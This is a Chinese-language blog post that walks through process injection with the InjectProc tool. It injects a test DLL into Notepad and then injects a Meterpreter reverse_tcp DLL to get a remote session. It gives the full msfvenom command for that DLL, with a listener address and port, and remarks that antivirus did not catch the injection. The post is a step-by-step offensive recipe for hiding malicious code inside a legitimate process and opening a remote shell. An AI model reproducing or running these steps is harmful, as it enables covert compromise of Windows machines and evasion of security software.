---
title: InjectProc&Metasploit
date: 2017-06-04 20:50:39
tags: Metasploit
categories: Metasploit
---
![enter description here][1]
<!--more-->
## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/InjectProc.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>

##  InjectProc
流程注入是一种非常受欢迎的方法来隐藏代码的恶意行为，并被恶意软件作者大量使用。

有几种技术，通常使用：DLL注入，过程替换（也称为工艺空心），钩注射和APC注射。

大多数使用相同的Windows API函数：OpenProcess，VirtualAllocEx，WriteProcessMemory，有关这些功能的详细信息，请使用MSDN。
&nbsp;
## DLL注入：
打开目标进程。
分配空间
将代码写入远程进程。
执行远程代码。
&nbsp;
具体可以看看github内容介绍。
&nbsp;
![enter description here][2]
&nbsp;
我看了大牛的视频自己学着模仿了一下
使用的InjectProc.exe在cmd运行
![enter description here][3]
&nbsp;
这位大牛在视频中演示四个部分 ，我自己也尝试了模仿了其中的一段，觉得不错，我将自己经验分享给各位。
首先我使用的是------  InjectProc.exe  dll_inj  path/to/dll.dll  notepad.exe
&nbsp;
首先下载到我的桌面，https://github.com/secrary/InjectProc ，和下载InjectProc.exe，是那位大牛制作完成的。
&nbsp;
![enter description here][4]
&nbsp;
![enter description here][5]
&nbsp;
## 0x01
首先打开我们的cmd 进入 InjectProc 目录当中，我们可以看到的目录。
&nbsp;
![enter description here][6]
&nbsp;
我们运行InjectProc.exe，并且使用dll_inj 参数，加上xxx.dll的路径 ，加上要注入的进程
InjectProc.exe  dll_inj  path/to/dll.dll  notepad.exe。
在这里我们使用InjectProc\test_files目录中的![enter description here][7]，并且我们随机打开一个进程如记事本进程。
使用以下命令：得到 mbox.exe----InjectProc弹框。并杀软未拦截的情况
&nbsp;
![enter description here][8]
&nbsp;
## 0x02
那么我们可以想到前阵子NSA 的工具包 使用msf生成的dll，得到会话。那么我们可以做下以下实验。
首先我们使用msfvenom 生成dll
<pre>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5555 -f dll >demon.dll</pre>
&nbsp;
![enter description here][9]
&nbsp;
以及打开我们的msf开启监听
![enter description here][10]
&nbsp;
那么我们将生成好的dll 丢到InjectProc目录中的随便一个文件中，比如我丢到InjectProc\test_files中![enter description here][11]
&nbsp;
使用以下命令,并且打开记事本。
&nbsp;
![enter description here][12]
&nbsp;
得到最终会话
![enter description here][1]
&nbsp;
&nbsp;
&nbsp;
视频资料：https://www.youtube.com/watch?v=GT9nBuXatmU   InjectProc | Process Injection Techniques | Malware 
https://www.pinterest.com/penetrationtesting/  
https://github.com/secrary/InjectProc   github


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496580960878.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496581431258.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496581536842.jpg
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496582442573.jpg
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496582390129.jpg
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496582636284.jpg
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496583170345.jpg
  [8]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496583297150.jpg
  [9]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496583594241.jpg
  [10]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496583722323.jpg
  [11]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496584076334.jpg
  [12]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496584220484.jpg 